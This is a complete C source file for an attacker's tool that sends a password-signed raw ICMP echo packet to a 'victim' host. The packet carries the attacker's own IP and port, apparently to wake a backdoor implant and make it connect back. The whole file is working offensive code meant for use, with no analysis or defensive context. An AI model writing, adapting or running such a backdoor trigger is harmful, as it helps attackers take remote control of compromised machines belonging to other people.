#include <stdio.h>
#include <stdlib.h>
#include <linux/types.h>
#include <linux/ip.h>
#include <linux/icmp.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <strings.h>
#include <errno.h>

#pragma pack(push)
#pragma pack(1)

typedef struct _param_data
{
	unsigned char sign[8];
	unsigned int ip;
	unsigned short port;
} param_data, *pparam_data;

typedef struct _icmp_echo_data
{
	struct icmphdr hdr;
	param_data param;
} icmp_echo_data, *picmp_echo_data;

#pragma pack(pop)

unsigned short mchecksum(unsigned char *buf, int len);
int main(int argc, char *argv[])
{
	if(argc != 5)
		return printf("%s <victim ip> <your ip> <your port> <password (8 byte max)>\r\n", argv[0]);
	const char *vip = argv[1], *yip = argv[2], *pass = argv[4];
	unsigned short yport = (unsigned short) atoi(argv[3]);
	if(!yport)
		return printf("port error.\r\n");
	
	picmp_echo_data packet_icmp_echo = (picmp_echo_data) malloc(sizeof(icmp_echo_data));
	
	int sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);
	if(!sockfd)
		return printf("[-] socket:%s\r\n", strerror(errno));
	bzero(packet_icmp_echo, sizeof(icmp_echo_data));
	packet_icmp_echo->hdr.type = ICMP_ECHO;
	packet_icmp_echo->hdr.code = 0;
	strncpy((char *) &packet_icmp_echo->param.sign, pass, 8);
	packet_icmp_echo->param.ip = inet_addr(yip);
	packet_icmp_echo->param.port = yport;
	//fill the checksum field
	packet_icmp_echo->hdr.checksum = 0;
	packet_icmp_echo->hdr.checksum = mchecksum((unsigned char *) packet_icmp_echo, sizeof(icmp_echo_data));
	//send icmp packet
	struct sockaddr_in dstaddr;
	bzero(&dstaddr, sizeof(struct sockaddr_in));
	dstaddr.sin_family = PF_INET;
	dstaddr.sin_addr.s_addr = inet_addr(vip);
	
	if(-1 == sendto(sockfd, (void *) packet_icmp_echo, sizeof(icmp_echo_data), 0, (struct sockaddr *) &dstaddr, sizeof(struct sockaddr)))
		return printf("[-] sendto:%s\r\n", strerror(errno));
	
	//free the packet buffer
	free(packet_icmp_echo);

	return 0;
}

unsigned short mchecksum(unsigned char *buf, int len)
{
	unsigned int sum = 0;
	unsigned short *cbuf;
     
    cbuf = (unsigned short *)buf;
    
    while(len > 1)
    {
        sum += *cbuf++;
        len -= 2;
    }
    if(len) sum += *(unsigned char *)cbuf;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return ~sum;
}

